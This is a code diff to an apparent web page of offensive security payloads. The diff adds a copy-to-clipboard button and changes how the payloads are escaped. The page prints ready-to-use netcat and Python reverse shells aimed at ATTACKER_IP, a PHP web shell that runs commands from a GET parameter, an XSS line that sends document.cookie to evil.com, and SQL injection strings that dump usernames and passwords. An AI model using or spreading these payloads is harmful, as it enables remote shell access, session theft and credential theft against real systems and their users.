@@ -39,6 +39,14 @@
             word-break: break-word;
             text-align: left;
         }
+        .copy-btn {
+            margin-top: 10px;
+            padding: 5px;
+            background: #222;
+            color: #00ff00;
+            border: none;
+            cursor: pointer;
+        }
     </style>
 </head>
 <body>
@@ -55,10 +63,8 @@
     <script>
         function showPayload(type) {
             let payloads = {
-                "Netcat Reverse Shell": `nc -e /bin/sh ATTACKER_IP PORT
-nc.exe -e cmd.exe ATTACKER_IP PORT`,
-                "PHP RCE": `<?php system($_GET['cmd']); ?>
-<?php eval($_GET['cmd']); ?>`,
+                "Netcat Reverse Shell": `nc -e /bin/sh ATTACKER_IP PORT\nnc.exe -e cmd.exe ATTACKER_IP PORT`,
+                "PHP RCE": `&lt;?php system($_GET['cmd']); ?&gt;\n&lt;?php eval($_GET['cmd']); ?&gt;`,
                 "Python Reverse Shell": `import socket,subprocess,os;
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
 s.connect(('ATTACKER_IP',PORT));
@@ -66,12 +72,22 @@ os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);
 p=subprocess.call(['/bin/sh','-i']);`,
-                "XSS Payloads": `"><script>alert(1)</script>
-\"><script>document.location='http://evil.com/steal.php?c='+document.cookie</script>`,
-                "SQL Injection": `"' OR '1'='1' -- 
-' UNION SELECT username,password FROM users -- "`
+                "XSS Payloads": `"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+"&gt;&lt;script&gt;document.location='http://evil.com/steal.php?c='+document.cookie&lt;/script&gt;"`,
+                "SQL Injection": `"' OR '1'='1' -- \n' UNION SELECT username,password FROM users -- "`
             };
-            document.getElementById("payload-container").innerHTML = `<div class='payload-box'><pre>${payloads[type]}</pre></div>`;
+
+            let payloadText = payloads[type];
+
+            document.getElementById("payload-container").innerHTML = `
+                <div class='payload-box'><pre>${payloadText}</pre></div>
+                <button class="copy-btn" onclick="copyToClipboard(\`${payloadText}\`)">📋 Copy</button>
+            `;
+        }
+
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text);
+            alert("Payload copied to clipboard!");
         }
     </script>
 </body>
